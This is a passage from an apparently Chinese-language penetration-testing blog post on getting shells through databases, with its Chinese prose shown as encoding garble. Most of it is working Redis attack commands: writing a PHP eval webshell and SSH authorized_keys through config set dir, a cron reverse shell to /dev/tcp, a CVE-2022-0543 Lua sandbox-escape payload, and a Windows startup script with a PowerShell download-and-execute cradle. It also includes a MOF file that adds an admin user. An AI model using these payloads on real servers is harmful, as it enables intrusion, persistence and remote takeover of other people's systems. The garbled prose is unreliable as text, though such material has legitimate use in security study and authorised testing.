<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> pg_ls_dir(<span class="string">&#x27;/etc&#x27;</span>);</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="è¿æ¥IP-3"><a href="#è¿æ¥IP-3" class="headerlink" title="è¿æ¥IP"></a>è¿æ¥IP</h3><blockquote>
<p>åœ¨PostgreSQLä¸­ï¼Œå…ˆåˆ‡æ¢åˆ°å…·ä½“åº“ä¸‹ï¼Œå†è¿è¡Œå¦‚ä¸‹å‘½ä»¤åˆ—å‡ºè¿æ¥ä¿¡æ¯ã€‚</p>
</blockquote>
<figure class="highlight postgresql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pid, usename, client_addr, application_name <span class="keyword">FROM</span> pg_stat_activity <span class="keyword">WHERE</span> datname = <span class="string">&#x27;&lt;database_name&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>



<br/>

<hr>
<hr>
<br/>

<h1 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h1><blockquote>
<p><em>MongoDB</em>æ˜¯ä¸€ä¸ª<em>å®‰å…¨</em>æ€§ç›¸å¯¹è¾ƒé«˜çš„éå…³ç³»å‹æ•°æ®åº“ï¼Œå®ƒçš„<em>å®‰å…¨</em>é—®é¢˜ä¸»è¦å‡ºç°åœ¨ä½¿ç”¨ã€é…ç½®è¿‡ç¨‹å½“ä¸­ï¼Œå¦‚æœªæˆæƒè®¿é—®ï¼Œå¼±å¯†ç ã€‚</p>
</blockquote>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/codingo/</span>NoSQLMap</span><br></pre></td></tr></table></figure>

<br/>

<hr>
<br/>

<h2 id="Other-4"><a href="#Other-4" class="headerlink" title="Other"></a>Other</h2><br/>



<h3 id="è¿æ¥IP-4"><a href="#è¿æ¥IP-4" class="headerlink" title="è¿æ¥IP"></a>è¿æ¥IP</h3><blockquote>
<p>åœ¨Mongodbä¸­ï¼Œå…ˆåˆ‡æ¢åˆ°å…·ä½“åº“ä¸‹ï¼Œå†è¿è¡Œå¦‚ä¸‹å‘½ä»¤åˆ—å‡ºè¿æ¥ä¿¡æ¯ã€‚</p>
</blockquote>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">db.currentOp(<span class="literal">true</span>).inprog.forEach(function(<span class="built_in">op</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">op</span>.client) &#123;</span><br><span class="line">      <span class="built_in">print</span>(<span class="built_in">op</span>.client, <span class="built_in">op</span>.clientMetadata.application);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>



<br/>

<hr>
<hr>
<br/>

<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><br/>



<h2 id="Redis-GetShell"><a href="#Redis-GetShell" class="headerlink" title="Redis GetShell"></a>Redis GetShell</h2><br/>



<h3 id="Rediså†™Webshell"><a href="#Rediså†™Webshell" class="headerlink" title="Rediså†™Webshell"></a>Rediså†™Webshell</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>çŸ¥é“ç½‘ç«™çš„<code>ç»å¯¹è·¯å¾„</code></li>
<li>å…·æœ‰ç³»ç»Ÿè¶…çº§ç®¡ç†å‘˜æƒé™</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># è®¾ç½®Redis æœåŠ¡å™¨å¿«ç…§æ–‡ä»¶ç›®å½•ä¸ºWebç›®å½•</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/ </span><br><span class="line"># å°† Redis æœåŠ¡å™¨çš„å¿«ç…§æ–‡ä»¶åè®¾ç½®ä¸º test.php</span><br><span class="line">config <span class="built_in">set</span> dbfilename test.php</span><br><span class="line"># è¿™é‡Œçš„\r\n\r\ä»£è¡¨æ¢è¡Œçš„æ„æ€ï¼Œç”¨rediså†™å…¥æ–‡ä»¶çš„ä¼šè‡ªå¸¦ä¸€äº›ç‰ˆæœ¬ä¿¡æ¯ï¼Œä¸æ¢è¡Œå¯èƒ½ä¼šå¯¼è‡´æ— æ³•æ‰§è¡Œã€‚</span><br><span class="line"><span class="built_in">set</span> xxx &quot;\r\n\r\&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;\r\n\r\&quot; </span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/r35tart/RedisWriteFile.git">RedisWriteFile</a></li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 RedisWriteFile.py <span class="attribute">--rhost</span>=&lt;ç›®æ ‡IP&gt; <span class="attribute">--rport</span>=6379 <span class="attribute">--lhost</span>=&lt;VPSIP &gt;  <span class="attribute">--lport</span>=&lt;VPSç«¯å£&gt; <span class="attribute">--rpath</span>=<span class="string">&quot;/var/www/html/&quot;</span> <span class="attribute">--rfile</span>=test.php <span class="attribute">--lfile</span>=/home/test.php</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="Redis-å†™SSHå…¬é’¥"><a href="#Redis-å†™SSHå…¬é’¥" class="headerlink" title="Redis å†™SSHå…¬é’¥"></a>Redis å†™SSHå…¬é’¥</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li>ç›®æ ‡æœºå™¨å¼€å¯<code>SSH</code>æœåŠ¡ï¼Œä¸”å¯è¿œç¨‹è¿æ¥</li>
<li>è¿è¡ŒRedisçš„ç”¨æˆ·ä¸º<code>root</code>ç”¨æˆ·</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æŠŠå…¬é’¥å¯¼å…¥key.txtï¼Œå‰åæ·»åŠ \n\né˜²æ­¢å†™å…¥çš„å…¬é’¥ä¹±ç å¯¼è‡´ä¸å¯ç”¨</span></span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; 1.txt</span><br><span class="line">cat 1.txt | redis-cli -h 127.0.0.1 -p 6379 -x <span class="built_in">set</span> crackit</span><br><span class="line"><span class="comment"># è¿æ¥Redis</span></span><br><span class="line">redis-cli -h 127.0.0.1 -p 6379 </span><br><span class="line"><span class="comment"># æŠŠç›®å½•è®¾ä¸º/root/.ssh/</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ç›®å½•</span></span><br><span class="line">127.0.0.1:6379&gt; config get dir</span><br><span class="line"><span class="comment"># æ–‡ä»¶åè®¾ç½®ä¸ºauthorized_keys</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line"><span class="comment"># ä¿å­˜</span></span><br><span class="line">127.0.0.1:6379&gt; save</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## ä½¿ç”¨sshè¿æ¥</span></span><br><span class="line">ssh root@127.0.0.1 -p 22 -i /root/.ssh/id_rsa</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<br/>



<h3 id="ä¸»ä»å¤åˆ¶GetShell"><a href="#ä¸»ä»å¤åˆ¶GetShell" class="headerlink" title="ä¸»ä»å¤åˆ¶GetShell"></a>ä¸»ä»å¤åˆ¶GetShell</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶ã€‚</p>
</blockquote>
<ul>
<li><code>Redis 4.x</code>ä»¥åæ‰å¯ä»¥ä½¿ç”¨å¤–éƒ¨æ‰©å±•åŠŸèƒ½ã€‚</li>
<li><code>Redis4.x&lt;=Redi5.0.5</code></li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/redis-rogue-server">redis-rogue-server</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å–äº¤äº’å¼shell</span></span><br><span class="line">./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="è®¡åˆ’ä»»åŠ¡GetShell"><a href="#è®¡åˆ’ä»»åŠ¡GetShell" class="headerlink" title="è®¡åˆ’ä»»åŠ¡GetShell"></a>è®¡åˆ’ä»»åŠ¡GetShell</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶</p>
</blockquote>
<ul>
<li>ä»…é™<code>CentOS</code>å¯ç”¨</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªåä¸ºxxçš„é”®ï¼Œå€¼è®¾ç½®ä¸ºæ¯åˆ†é’Ÿåå¼¹shellçš„å‘½ä»¤</span></span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> xx <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/6336 0&gt;&amp;1\n&quot;</span></span><br><span class="line"><span class="comment"># è®¾ç½®RedisæœåŠ¡å™¨å¿«ç…§æ–‡ä»¶ç›®å½•ä¸ºè®¡åˆ’ä»»åŠ¡çš„é…ç½®æ–‡ä»¶ç›®å½•</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line"><span class="comment"># å¿«ç…§æ–‡ä»¶åç§°ä¸ºrootï¼Œä¹Ÿå°±æ˜¯å†™å…¥/var/spool/cron/root</span></span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="comment"># ä¿å­˜</span></span><br><span class="line">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="æ²™ç›’é€ƒé€¸"><a href="#æ²™ç›’é€ƒé€¸" class="headerlink" title="æ²™ç›’é€ƒé€¸"></a>æ²™ç›’é€ƒé€¸</h3><blockquote>
<p>CVE-2022-0543</p>
<p>Ubuntuå‘è¡Œç‰ˆçš„æºåœ¨æ‰“åŒ…Redisæ—¶ï¼Œä¸æ…åœ¨Luaæ²™ç®±ä¸­é—ç•™äº†ä¸€ä¸ªå¯¹è±¡<code>package</code>ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¯¹è±¡æä¾›çš„æ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“libluaé‡Œçš„å‡½æ•°ï¼Œè¿›è€Œé€ƒé€¸æ²™ç®±æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶</p>
</blockquote>
<ul>
<li>Ubuntuç³»ç»Ÿ</li>
<li>2.2 &lt;= redis &lt; 5.0.13</li>
<li>2.2 &lt;= redis &lt; 6.0.15</li>
<li>2.2 &lt;= redis &lt; 6.2.5</li>
</ul>
<blockquote>
<p>éœ€è¦çŸ¥é“package.loadlibçš„è·¯å¾„</p>
<p>åˆ©ç”¨luaopen_ioå‡½æ•°</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">&#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;whoami&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27;</span> 0</span><br></pre></td></tr></table></figure>

<br/>

<hr>
<br/>

<h2 id="Windows-Getshell"><a href="#Windows-Getshell" class="headerlink" title="Windows Getshell"></a>Windows Getshell</h2><blockquote>
<p>Rediså®˜æ–¹æ˜¯ä¸å»ºè®®åœ¨Windowsä¸‹ä½¿ç”¨Redisçš„ï¼Œä¸”å¾®è½¯ç»´æŠ¤çš„Windwoså¼€æºç‰ˆæœ¬åªæœ‰3.Xã€‚</p>
</blockquote>
<br/>



<h3 id="Windowså†™å…¥WebShell"><a href="#Windowså†™å…¥WebShell" class="headerlink" title="Windowså†™å…¥WebShell"></a>Windowså†™å…¥WebShell</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶</p>
</blockquote>
<ul>
<li>çŸ¥é“ç½‘ç«™çš„<code>ç»å¯¹è·¯å¾„</code></li>
<li>å…·æœ‰ç³»ç»Ÿè¶…çº§ç®¡ç†å‘˜æƒé™</li>
</ul>
<blockquote>
<p>å’ŒLinuxä¸€æ ·å†™å…¥æ–‡ä»¶å°±è¡Œäº†</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir C:\phpstudy_pro\WWW\</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename test.php</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> xxx <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;test&#x27;]);?&gt;&quot;</span> </span><br><span class="line">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="Windowså†™å…¥å¯åŠ¨é¡¹"><a href="#Windowså†™å…¥å¯åŠ¨é¡¹" class="headerlink" title="Windowså†™å…¥å¯åŠ¨é¡¹"></a>Windowså†™å…¥å¯åŠ¨é¡¹</h3><blockquote>
<p>å‰æéœ€è¦æ»¡è¶³çš„æ¡ä»¶</p>
</blockquote>
<ul>
<li>çŸ¥é“æœåŠ¡å™¨ç”¨æˆ·åä¸€èˆ¬ä¸º<code>Administrator</code></li>
<li>å…·æœ‰ç³»ç»Ÿè¶…çº§ç®¡ç†å‘˜æƒé™</li>
<li>éœ€è¦æœåŠ¡å™¨<code>é‡å¯</code>ï¼Œ<code>é‡å¯!!</code></li>
</ul>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="builtin-name">set</span> dir <span class="string">&quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/&quot;</span></span><br><span class="line">config <span class="builtin-name">set</span> dbfilename 1.bat</span><br><span class="line"><span class="builtin-name">set</span> xxx <span class="builtin-name">set</span> x <span class="string">&quot;/r/n/r/npowershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://127.0.0.1/a&#x27;))\&quot;/r/n/r/n</span></span><br><span class="line"><span class="string">save</span></span><br></pre></td></tr></table></figure>



<br/>



<h3 id="Windows-å†™å…¥mof"><a href="#Windows-å†™å…¥mof" class="headerlink" title="Windows å†™å…¥mof"></a>Windows å†™å…¥mof</h3><blockquote>
<p>mofæ˜¯windowsç³»ç»Ÿçš„ä¸€ä¸ªæ–‡ä»¶ï¼ˆåœ¨<code>c:/windows/system32/wbem/mof/nullevt.mof</code>ï¼‰å«åšâ€æ‰˜ç®¡å¯¹è±¡æ ¼å¼â€å…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ã€‚å…¶å®å°±æ˜¯ä¸Šä¼ mofæ–‡ä»¶ï¼Œéš”äº†ä¸€å®šæ—¶é—´ä»¥åè¿™ä¸ªmofå°±ä¼šè¢«æ‰§è¡Œï¼Œè¿™ä¸ªmofå½“ä¸­æœ‰ä¸€æ®µæ˜¯vbsè„šæœ¬ï¼Œè¿™ä¸ªvbså¤§å¤šæ•°çš„æ˜¯cmdçš„æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·çš„å‘½ä»¤ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´åœ¨<code>c:/windows/system32/wbem/mof/</code>ç›®å½•ä¸‹çš„mofæ–‡ä»¶ä¼šæ¯5ç§’è‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œè¿™æ ·å°±ä¸éœ€è¦é‡å¯æœºå™¨å°±èƒ½è·å–æƒé™äº†ã€‚<code>2003</code>å¯ä»¥è¯•ä¸€ä¸‹</p>
</blockquote>
<blockquote>
<p>ä¿å­˜å¦‚ä¸‹ä»£ç ä¸º <code>admin.txt</code> æ–‡ä»¶:</p>
</blockquote>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma namespace(&quot;\\.\root\subscription&quot;) instance of __EventFilter as $EventFilter &#123; EventNamespace = &quot;Root\Cimv2&quot;; Name  = &quot;filtP2&quot;; Query = &quot;Select * From __InstanceModificationEvent &quot; &quot;Where TargetInstance Isa &quot;Win32_LocalTime&quot; &quot; &quot;And TargetInstance.Second = 5&quot;; QueryLanguage = &quot;WQL&quot;; &#125;; instance of ActiveScriptEventConsumer as $Consumer &#123; Name = &quot;consPCSV2&quot;; ScriptingEngine = &quot;JScript&quot;; ScriptText = &quot;var WSH = new ActiveXObject(&quot;WScript.Shell&quot;)nWSH.run(&quot;net.exe user admin admin /add&quot;)&quot;; &#125;; instance of __FilterToConsumerBinding &#123; Consumer   = $Consumer; Filter = $EventFilter; &#125;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
</blockquote>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e &quot;nn&quot;; cat admin.txt; <span class="built_in">echo</span> -e &quot;nn&quot;) &gt; foo.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ç„¶åå†æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat foot.txt | redis-cli -h 127.0.0.1 -x <span class="built_in">set</span> x</span><br><span class="line">redis-cli -h 127.0.0.1</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dir c:/windows/system32/wbem/mof/</span><br><span class="line">127.0.0.1:6379&gt; config <span class="built_in">set</span> dbfilename admin1.mof</span><br><span class="line">127.0.0.1:6379&gt; save</span><br></pre></td></tr></table></figure>



<br/>



<h3 id="Windowsä¸»ä»åŠ«æŒDLL"><a href="#Windowsä¸»ä»åŠ«æŒDLL" class="headerlink" title="Windowsä¸»ä»åŠ«æŒDLL"></a>Windowsä¸»ä»åŠ«æŒDLL</h3><blockquote>
<p>åˆ©ç”¨dllåŠ«æŒå¯ä»¥ä¸ç”¨é‡å¯è·å–shell</p>
<p>ä¸ºä»€ä¹ˆç›´æ¥ä¸»ä»å¤åˆ¶è·å–shellã€‚å› ä¸ºä½¿ç”¨ä¸»ä»å¤åˆ¶RCEçš„å‰ææ˜¯éœ€è¦å…³é”®æ¨¡å—MODULE LOADï¼Œè¿™ä¸ªæ˜¯redis4.0ä»¥åæ‰æœ‰çš„ï¼Œè€Œwindowsç›®å‰æ”¯æŒçš„æœ€é«˜ç‰ˆæœ¬æ˜¯3.2ã€‚</p>
</blockquote>
<ul>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzMjg0MjM5OQ==&mid=2247486964&idx=1&sn=9576c72e926b0d8eff8e027899216839&chksm=e88ff804dff87112d29dc8d31a908d63db0ce2a749d3519007d2bebeabb9e3d7bbd05c776cfe&mpshare=1&scene=1&srcid=0125rPu3PhHkHBMDKX7B2eKi&sharer_shareinfo=ad56969d13bc7f28aa59498f67632954&sharer_shareinfo_first=ad56969d13bc7f28aa59498f67632954&from=groupmessage&isappinstalled=0&clicktime=1708415205&enterid=1708415205&ascene=1&devicetype=iOS17.0&version=18002f28&nettype=WIFI&abtest_cookie=AAACAA==&lang=zh_CN&countrycode=IS&fontScale=100&exportkey=n_ChQIAhIQYl5xw1lC6rsApSoZ8yKlMhLtAQIE97dBBAEAAAAAAK0IBOQhxucAAAAOpnltbLcz9gKNyK89dVj0lHj52JKtigsEiwCPjMZm44/Sk8Zi0SA95StHDgUUQt42xZPoBvkn0uItEw/myz+5Wk/J6iHBIC/AmFyM1QyMVkXhiwNhADNL+d5Jkpt4/cOND+q4NCB+v3JLFoeUMnOAsFFvYJpOT2uk2HVyW36ecfKer2Nn1cOR0rmlnXasKB4DrO+KPi5lG8p5x5ldCn8t/RCWKUKWr/+lCcjOLHwWxL7vx/ZsSiHHYO49P03sqHQOaTLtOWNizDHUrxkUa1qDOxZ8jNfkng==&pass_ticket=vCnBb7qp3X6L7RHbf4qliiqFMg3+eW+XSDHlf8q76FEzrqkJSPy305Qcj5XXZziVJ4BeRKwDc5ZHoQM7Wj+ZGw==&wx_header=3">åˆ©ç”¨æ‰‹æ³•</a></li>
</ul>
<br/>

<hr>
<br/>

<h2 id="Other-5"><a href="#Other-5" class="headerlink" title="Other"></a>Other</h2><br/>



<h3 id="è¿æ¥IP-5"><a href="#è¿æ¥IP-5" class="headerlink" title="è¿æ¥IP"></a>è¿æ¥IP</h3><blockquote>
<p>åœ¨Redisä¸­ï¼Œè¿è¡Œå¦‚ä¸‹å‘½ä»¤åˆ—å‡ºè¿æ¥ä¿¡æ¯ï¼Œ<database_index>æ˜¯æ•°æ®åº“çš„ç´¢å¼•å·ï¼Œä»0å¼€å§‹ã€‚</p>
</blockquote>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CLIENT LIST | <span class="keyword">grep</span> <span class="symbol">&lt;database_index&gt;</span></span><br></pre></td></tr></table></figure>


	  <div class="article-footer-copyright">

    æœ¬åšå®¢é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">çŸ¥è¯†å…±äº«ç½²å-éå•†ä¸šæ€§ä½¿ç”¨-ç›¸åŒæ–¹å¼å…±äº« 4.0 å›½é™…è®¸å¯åè®®(CC BY-NC-SA 4.0) å‘å¸ƒ.</a>
</div>

	</div>

	
	<span id="/post/DBGetShell/" class="leancloud-visitors view" data-flag-title="DBGetShell">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/post/å†…ç½‘æ¨ªå‘/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>

    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-01-07 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%89%BE%E5%B7%A5%E4%BD%9C%EF%BC%8C%E5%B9%B4%E5%90%8E%E5%BA%94%E8%AF%A5%E5%B2%97%E4%BD%8D%E5%8F%AF%E4%BB%A5%E5%BC%80%E6%94%BE%E5%87%BA%E6%9D%A5%E4%BA%86%E5%90%A7"><span class="toc-article-text">æ‰¾å·¥ä½œï¼Œå¹´ååº”è¯¥å²—ä½å¯ä»¥å¼€æ”¾å‡ºæ¥äº†å§.</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E9%9C%80%E8%A6%81%E6%89%BE%E4%B8%80%E4%BB%BD%E6%B8%97%E9%80%8F%E5%B2%97%E5%B7%A5%E4%BD%9C%EF%BC%8C%E5%A6%82%E6%9C%89%E9%9C%80%E8%A6%81%E8%AF%B7%E8%81%94%E7%B3%BB%E6%88%91%F0%9F%93%AE%E9%82%AE%E7%AE%B1"><span class="toc-article-text">éœ€è¦æ‰¾ä¸€ä»½æ¸—é€å²—å·¥ä½œï¼Œå¦‚æœ‰éœ€è¦è¯·è”ç³»æˆ‘ğŸ“®é‚®ç®±</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Mysql"><span class="toc-article-text">Mysql</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Mysql-GetShell"><span class="toc-article-text">Mysql GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#INTO-OUTFILE-Get-WebShell"><span class="toc-article-text">INTO OUTFILE Get WebShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%85%A2%E6%97%A5%E5%BF%97%E5%86%99-WebShell"><span class="toc-article-text">æ…¢æ—¥å¿—å†™ WebShell</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-article-text">èº«ä»½è®¤è¯ç»•è¿‡</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Mysql-%E6%8F%90%E6%9D%83"><span class="toc-article-text">Mysql ææƒ</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#UDP%E6%8F%90%E6%9D%83"><span class="toc-article-text">UDPææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MOF%E6%8F%90%E6%9D%83"><span class="toc-article-text">MOFææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-article-text">å¯åŠ¨é¡¹ææƒ</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2016-6663"><span class="toc-article-text">CVE-2016-6663</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Other"><span class="toc-article-text">Other</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%87%E4%BB%B6"><span class="toc-article-text">è¯»å–æœåŠ¡å™¨æ–‡ä»¶</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AF%BB%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%96%87%E4%BB%B6"><span class="toc-article-text">è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%AF%BC%E5%87%BA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-article-text">å¯¼å‡ºæ•°æ®åº“</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%BF%9E%E6%8E%A5IP"><span class="toc-article-text">è¿æ¥IP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#Sqlmap"><span class="toc-article-text">Sqlmap</span></a></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#MSSQL"><span class="toc-article-text">MSSQL</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#MSSQL-GetShell"><span class="toc-article-text">MSSQL GetShell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#MSSQL-%E6%9D%83%E9%99%90%E5%88%92%E5%88%86"><span 